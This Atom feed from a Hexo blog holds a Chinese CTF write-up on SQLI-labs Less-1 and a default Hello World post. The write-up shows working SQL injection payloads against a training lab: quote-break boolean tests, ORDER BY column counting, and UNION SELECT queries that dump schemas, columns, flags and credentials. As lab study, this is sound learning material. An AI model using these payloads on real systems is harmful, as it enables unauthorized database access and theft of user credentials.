<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-17T14:31:06.047Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>小韩</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://example.com/2021/02/17/SQLI-labs%20%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/"/>
    <id>http://example.com/2021/02/17/SQLI-labs%20%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/</id>
    <published>2021-02-17T14:30:45.431Z</published>
    <updated>2021-02-17T14:31:06.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQLI-labs-个人心得"><a href="#SQLI-labs-个人心得" class="headerlink" title="SQLI-labs 个人心得"></a>SQLI-labs 个人心得</h1><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 本人在写CTF中SQLI-labs的例题时，刚开始一点思路也没有，很茫然，感觉无处下手，于是我就百度了一下，再加之在B站找了个视频看了看，通过视频与一些博客，总算是有了一点思路，本片博客主要是针对于本人自己学习中的一些心得进行总结，用于自用。</p><p>在做题时参考了这篇文章</p><blockquote><p><a href="https://blog.csdn.net/qq_41429081/article/details/101167892">https://blog.csdn.net/qq_41429081/article/details/101167892</a></p></blockquote><hr><h2 id="SQLI-labs-less-1"><a href="#SQLI-labs-less-1" class="headerlink" title="SQLI-labs-less-1"></a>SQLI-labs-less-1</h2><p> 刚开始先在URL中对于ID进行更改。</p><p><img src="https://img-blog.csdnimg.cn/20201110210923120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4MTc1MDY3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><p>构造payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">48</span>cbd<span class="hljs-number">059</span>-c<span class="hljs-number">54</span>c-<span class="hljs-number">48</span>fe-b<span class="hljs-number">4</span>ec-<span class="hljs-number">2</span>b<span class="hljs-number">1</span>ea<span class="hljs-number">12</span>aebab.node<span class="hljs-number">3</span>.buuoj.cn/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br><span class="hljs-attribute">1</span><br></code></pre></td></tr></table></figure><p>页面显示正常</p><p><img src="https://img-blog.csdnimg.cn/20201110210948448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4MTc1MDY3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">48</span>cbd<span class="hljs-number">059</span>-c<span class="hljs-number">54</span>c-<span class="hljs-number">48</span>fe-b<span class="hljs-number">4</span>ec-<span class="hljs-number">2</span>b<span class="hljs-number">1</span>ea<span class="hljs-number">12</span>aebab.node<span class="hljs-number">3</span>.buuoj.cn/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br><span class="hljs-attribute">1</span><br></code></pre></td></tr></table></figure><p>页面无数据</p><p><img src="https://img-blog.csdnimg.cn/2020111021095931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4MTc1MDY3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>所以此处存在SQL注入漏洞</p><h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><p>因为前面测得具有回显，所以采取union联合查询</p><h4 id="1-查找列数"><a href="#1-查找列数" class="headerlink" title="1.查找列数"></a>1.查找列数</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">48</span>cbd<span class="hljs-number">059</span>-c<span class="hljs-number">54</span>c-<span class="hljs-number">48</span>fe-b<span class="hljs-number">4</span>ec-<span class="hljs-number">2</span>b<span class="hljs-number">1</span>ea<span class="hljs-number">12</span>aebab.node<span class="hljs-number">3</span>.buuoj.cn/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">3</span> --+ <br><span class="hljs-attribute">1</span><br></code></pre></td></tr></table></figure><p>–+主要用于注释掉SQL语句后面的内容，该题所查出的列数为3列。</p><h4 id="2-查询数据库"><a href="#2-查询数据库" class="headerlink" title="2.查询数据库"></a>2.查询数据库</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">48</span>cbd<span class="hljs-number">059</span>-c<span class="hljs-number">54</span>c-<span class="hljs-number">48</span>fe-b<span class="hljs-number">4</span>ec-<span class="hljs-number">2</span>b<span class="hljs-number">1</span>ea<span class="hljs-number">12</span>aebab.node<span class="hljs-number">3</span>.buuoj.cn/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)&#x27;<br><span class="hljs-attribute">1</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/2020111021101899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4MTc1MDY3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>id传入一个数据库中没有的值即可，因为如果是数据库中存在的值，即会返回多条记录，会显示前一个找到的值，而我们想要的将无法显示。同时使用GROUP_CONCAT将查询到的数据库名拼接显示</p><h4 id="3-查表中字段"><a href="#3-查表中字段" class="headerlink" title="3.查表中字段"></a>3.查表中字段</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://a<span class="hljs-number">34</span>dda<span class="hljs-number">74</span>-<span class="hljs-number">400</span>a-<span class="hljs-number">49</span>ee-b<span class="hljs-number">839</span>-d<span class="hljs-number">7</span>e<span class="hljs-number">83</span>a<span class="hljs-number">46</span>b<span class="hljs-number">079</span>.node<span class="hljs-number">3</span>.buuoj.cn/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;flag&#x27;)&#x27;<br><span class="hljs-attribute">1</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/2020112920591277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4MTc1MDY3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="4-查数据取得FALG"><a href="#4-查数据取得FALG" class="headerlink" title="4.查数据取得FALG"></a>4.查数据取得FALG</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://a<span class="hljs-number">34</span>dda<span class="hljs-number">74</span>-<span class="hljs-number">400</span>a-<span class="hljs-number">49</span>ee-b<span class="hljs-number">839</span>-d<span class="hljs-number">7</span>e<span class="hljs-number">83</span>a<span class="hljs-number">46</span>b<span class="hljs-number">079</span>.node<span class="hljs-number">3</span>.buuoj.cn/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">1</span>,(SELECT GROUP_CONCAT(flag) FROM ctftraining.flag)&#x27;<br><span class="hljs-attribute">1</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20201110211033599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4MTc1MDY3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>取到了FLAG！</p><h2 id="SQLI-labs-less-2-4"><a href="#SQLI-labs-less-2-4" class="headerlink" title="SQLI-labs-less-2-4"></a>SQLI-labs-less-2-4</h2><p>其实在做完了前四道题之后我发现，前四道题都是同一个套路，只需要走一遍流程就可以了，没有太大的区别！</p><p>主要就是先用ID=1来进行判断数据是否显示，然后通过or或者and式子判断是否有SQL注入漏洞，然后开始联合查询就可。</p><p>只不过依次检测是单引号闭合或者是双引号或者括号的闭合问题！</p><h2 id="四个查询语句"><a href="#四个查询语句" class="headerlink" title="四个查询语句"></a>四个查询语句</h2><p>1.查库：<code>select schema_name from information_schema.schemata</code><br> 2.查表：<code>select table_name from information_schema.tables where table_schema=&#39;security&#39;</code><br> 3.查列：<code>select column_name from information_schema.columns where table_name=&#39;users&#39;</code><br> 4.查字段：<code>select username,password from security.user</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQLI-labs-个人心得&quot;&gt;&lt;a href=&quot;#SQLI-labs-个人心得&quot; class=&quot;headerlink&quot; title=&quot;SQLI-labs 个人心得&quot;&gt;&lt;/a&gt;SQLI-labs 个人心得&lt;/h1&gt;&lt;hr&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/02/17/hello-world/"/>
    <id>http://example.com/2021/02/17/hello-world/</id>
    <published>2021-02-17T12:54:26.205Z</published>
    <updated>2021-02-17T12:54:26.205Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
